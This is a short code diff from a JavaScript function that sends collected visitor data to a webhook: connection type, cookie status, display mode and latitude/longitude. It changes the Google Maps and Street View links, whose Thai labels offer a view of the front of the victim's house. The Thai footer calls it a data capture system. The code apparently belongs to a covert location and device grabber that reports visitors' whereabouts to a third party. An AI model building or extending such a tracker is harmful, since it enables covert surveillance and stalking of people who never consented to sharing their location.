@@ -198,8 +198,16 @@ async function sendToWebhook() {
                 { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
                 { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
                 { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
-                { name: "🏙️ Street View", value: `http://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}`, inline: false },
-                { name: "🗺️ Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}`, inline: false }
+{
+    name: "🏙️ Street View",
+    value: `[ดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`,
+    inline: false
+},
+{
+    name: "🗺️ Google Maps",
+    value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`,
+    inline: false
+}
             ],
             footer: { text: "ระบบดักจับข้อมูลเสร็จสิ้น" },
             timestamp: new Date().toISOString()
